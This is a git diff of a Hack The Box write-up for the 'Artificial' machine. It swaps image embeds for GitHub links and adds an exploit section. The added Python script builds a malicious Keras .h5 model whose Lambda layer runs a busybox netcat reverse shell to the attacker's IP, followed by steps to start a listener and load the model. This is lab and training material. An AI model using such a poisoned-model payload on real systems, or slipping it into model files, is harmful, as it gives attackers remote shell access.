@@ -28,19 +28,14 @@ sudo echo "10.10.11.74     artificial.htb" >> /etc/hosts
 ```
 
 simple looking ui 
-
-![[Pasted image 20251017162502.png]]
-
+<img src="https://raw.githubusercontent.com/Baga6312/HTB-Writeups/refs/heads/main/machines/artificial/assets/Pasted image 20251017162502.png">
 registering a new account and logging in with it 
-
-![[Pasted image 20251017162718.png]]
-
+<img src="https://raw.githubusercontent.com/Baga6312/HTB-Writeups/refs/heads/main/machines/artificial/assets/Pasted image 20251017162718.png">
 this will lead us to the page where it present us with this .. 
-![[Pasted image 20251017162855.png]]
-
+<img src="https://raw.githubusercontent.com/Baga6312/HTB-Writeups/refs/heads/main/machines/artificial/assets/Pasted image 20251017162855.png">
 checking the `requirement.txt` and `Dockerfile` 
 
-dockerfile 
+Dockerfile 
 ```
 FROM python:3.8-slim
 
@@ -73,10 +68,34 @@ https://mastersplinter.work/research/tensorflow-rce/
 
 the idea is to generate a `.h5` model that contains our malicious command so we can import it and get a reverse shell 
 
-to recreate the exploti we need first to install tensor flow on a 
+to recreate the exploit we need first to install tensorflow on our machine  (which is annoying task) 
 
 
+```python3 
+import tensorflow as tf
 
+def exploit(x):
+    import os
+    os.system("busybox nc 10.10.15.53 4444 -e /bin/sh")
+    return x
+
+model = tf.keras.Sequential()
+model.add(tf.keras.layers.Input(shape=(64,)))
+model.add(tf.keras.layers.Lambda(exploit))
+model.compile()
+model.save("exploit.h5")
+```
+
+I always use busybox since its found on every linux distro . 
+
+generating our model 
+```cmd
+python3 exploit.py 
+```
+
+opening a listener on our machine 
+<img src="https://raw.githubusercontent.com/Baga6312/HTB-Writeups/refs/heads/main/machines/artificial/assets/Pasted image 20251017165134.png">
+and finally importing our model will give us a shell 
 
 
 
